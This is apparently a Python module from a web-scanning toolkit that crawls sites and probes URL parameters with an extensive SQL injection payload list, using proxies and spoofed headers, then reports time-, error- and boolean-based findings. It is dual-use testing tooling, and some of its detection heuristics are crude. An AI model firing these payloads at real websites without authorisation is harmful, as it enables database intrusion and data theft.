import re
import aiohttp
import asyncio
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from ..utils.helpers import LOG, save_to_html, send_telegram_alert
from ..utils.spoofagent import get_spoofed_headers
from ..utils.proxy_manager import shared_proxy_manager

class SQLiScanner:
    def __init__(self):
        self.visited_urls = set()
        self.sqli_payloads = [
            # Boolean-based
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            # Error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            "' AND (SELECT 6 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
            "' AND (SELECT 2 FROM (SELECT COUNT(*),CONCAT(CHAR(58),VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            # Time-based
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5(1))--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5) AND '1'='1",
            # Union-based
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT @@version--",
            # Stacked queries
            "'; SELECT SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            # NoSQL injection
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "sleep(5000)"}',
            # Modern database specific
            # PostgreSQL
            "' AND (SELECT pg_sleep(5))--",
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            # MySQL
            "' AND IF(1=1,SLEEP(5),'a')--",
            "' AND RLIKE SLEEP(5)--",
            # MSSQL
            "' IF 1=1 WAITFOR DELAY '0:0:5'--",
            "' WAITFOR DELAY '0:0:5'--",
            # Oracle
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--",
            # Filter bypass
            "' /*!50000OR*/ '1'='1",
            "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3--",
            "' /*!50000AND*/ SLEEP(5)--",
            # Encoded payloads
            "%27%20OR%20%271%27%3D%271",
            "%27%20AND%20SLEEP%285%29--",
        ]
        self.error_patterns = [
            # MySQL
            "You have an error in your SQL syntax",
            "Warning: mysql_",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "check the manual that corresponds to your MySQL server version",
            # PostgreSQL
            "PostgreSQL.*ERROR",
            "Warning: pg_",
            "valid PostgreSQL result",
            "Npgsql.",
            # MSSQL
            "Microsoft SQL Native Client error",
            "SQLServer JDBC Driver",
            "SqlException",
            "System.Data.SqlClient",
            "Server Error in '/' Application",
            "Microsoft OLE DB Provider for SQL Server",
            "ODBC SQL Server Driver",
            "[SQL Server]",
            # Oracle
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "Oracle.*Driver",
            "Warning: oci_",
            "quoted string not properly terminated",
            # SQLite
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            # General SQL
            "SQL syntax.*MySQL",
            "Warning: .*mysql_.*",
            "valid MySQL result",
            "MariaDB server version for the right syntax",
            # Database disclosure
            "DB2 SQL error:",
            "database.*driver",
            "database.*error",
            "JDBC Driver",
            "JDBC Error",
            "JDBC Connection",
        ]
        
    async def crawl(self, url):
        """Crawl a website to find potential SQL injection points"""
        try:
            session = await shared_proxy_manager.get_session()
            async with session.get(url) as response:
                if response.status == 200:
                    html = await response.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    
                    # Find all forms
                    for form in soup.find_all('form'):
                        form_url = urljoin(url, form.get('action', ''))
                        self.visited_urls.add(form_url)
                        
                    # Find all links with parameters
                    for a in soup.find_all('a', href=True):
                        link = urljoin(url, a['href'])
                        if self._should_test_url(link):
                            self.visited_urls.add(link)
                            
        except Exception as e:
            LOG(f"[!] Error crawling {url}: {e}")
            
    def _should_test_url(self, url):
        """Check if URL should be tested for SQL injection"""
        try:
            parsed = urlparse(url)
            # Check if URL has parameters
            return (
                bool(parsed.query) and
                not any(x in url.lower() for x in ['.jpg', '.png', '.gif', '.css', '.js']) and
                url not in self.visited_urls
            )
        except:
            return False
            
    async def test_sqli(self, url):
        """Test for SQL injection vulnerabilities. Returns detailed finding dict if found, else None."""
        if not url:
            return None
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param, values in params.items():
                original_value = values[0]
                for payload in self.sqli_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                    # Test for time-based injection
                    if 'SLEEP' in payload or 'WAITFOR' in payload or 'BENCHMARK' in payload or 'pg_sleep' in payload:
                        if await self._test_time_based(test_url):
                            return {
                                'type': 'sqli',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'context': 'time-based',
                                'evidence': f"Response time > 5s for payload: {payload}",
                                'details': 'Time-based SQL injection',
                                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                            }
                    # Test for error-based injection
                    if await self._test_error_based(test_url, original_value):
                        return {
                            'type': 'sqli',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'context': 'error-based',
                            'evidence': f"SQL error pattern detected for payload: {payload}",
                            'details': 'Error-based SQL injection',
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        }
                    # Test for boolean-based injection
                    if await self._test_boolean_based(test_url, original_value):
                        return {
                            'type': 'sqli',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'context': 'boolean-based',
                            'evidence': f"Boolean-based difference detected for payload: {payload}",
                            'details': 'Boolean-based SQL injection',
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        }
        except Exception as e:
            LOG(f"[!] Error testing SQL injection on {url}: {e}")
        return None
        
    async def _test_time_based(self, url):
        """Test for time-based SQL injection"""
        try:
            start_time = time.time()
            session = await shared_proxy_manager.get_session()
            async with session.get(url, timeout=10) as response:
                await response.text()
                response_time = time.time() - start_time
                
                # If response took more than 5 seconds, likely vulnerable
                return response_time > 5
                
        except asyncio.TimeoutError:
            # Timeout could indicate successful time-based injection
            return True
        except Exception:
            return False
            
    async def _test_error_based(self, url, original_value):
        """Test for error-based SQL injection"""
        try:
            session = await shared_proxy_manager.get_session()
            async with session.get(url) as response:
                content = await response.text()
                
                # Check for SQL error messages
                for pattern in self.error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return True
                        
                # Check if the page content changed significantly
                if self._content_changed_significantly(content, original_value):
                    return True
                    
        except Exception:
            return False
            
        return False
        
    async def _test_boolean_based(self, url, original_value):
        """Test for boolean-based SQL injection"""
        try:
            # Test true condition
            true_url = url + " AND 1=1"
            session = await shared_proxy_manager.get_session()
            async with session.get(true_url) as true_response:
                true_content = await true_response.text()
                
                # Test false condition
                false_url = url + " AND 1=2"
                async with session.get(false_url) as false_response:
                    false_content = await false_response.text()
                    
                    # If responses are different, might be vulnerable
                    return (
                        true_response.status == 200 and
                        false_response.status != 200 or
                        self._content_differs_significantly(true_content, false_content)
                    )
                    
        except Exception:
            return False
            
        return False
        
    def _content_changed_significantly(self, content, original_value):
        """Check if content changed significantly from original"""
        # Remove common dynamic content
        content = re.sub(r'<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>', '', content)
        content = re.sub(r'<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>', '', content)
        content = re.sub(r'<!\-\-.*?\-\->', '', content)
        
        # Calculate content length difference
        original_len = len(original_value) if original_value else 0
        new_len = len(content)
        
        # If length changed by more than 50%, consider it significant
        return abs(original_len - new_len) / max(original_len, 1) > 0.5
        
    def _content_differs_significantly(self, content1, content2):
        """Check if two responses differ significantly"""
        # Remove dynamic content
        content1 = re.sub(r'<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>', '', content1)
        content2 = re.sub(r'<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>', '', content2)
        
        # Calculate similarity ratio
        len1, len2 = len(content1), len(content2)
        max_len = max(len1, len2)
        if max_len == 0:
            return False
            
        # If length differs by more than 30%, consider it significant
        length_diff_ratio = abs(len1 - len2) / max_len
        return length_diff_ratio > 0.3 